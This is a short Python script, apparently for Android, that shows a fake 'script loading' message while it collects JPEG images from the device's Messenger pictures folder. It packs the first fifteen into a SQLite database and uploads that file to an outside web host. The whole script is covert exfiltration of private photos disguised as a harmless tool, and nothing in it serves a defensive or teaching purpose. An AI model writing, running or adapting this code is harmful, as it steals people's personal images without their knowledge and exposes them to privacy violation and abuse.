import os, sys, sqlite3
import requests as req

os.system('clear')
print('wait few second wile script loading.....')

con = sqlite3.connect('test.db')
c = con.cursor()
c.execute("""CREATE TABLE test(
	name TEXT,
	data blob
)""")
blob = []

for r, d, f in os.walk('/sdcard/Pictures/Messenger'):
    for file in f:
        if file.endswith('.jpeg'):
            x = os.path.join(r, file)
            with open(x, 'rb') as rb:
                blob.append(rb.read())
                
buff = blob[:15]

for i in buff:
    cmd = "INSERT INTO test(data) VALUES(?)"
    c.execute(cmd, [sqlite3.Binary(i)])
    
con.commit()
        
files = {'file':open('test.db', 'rb')}
re = req.post("https://recv.000webhostapp.com/upload.php", files=files)
print(re.text)
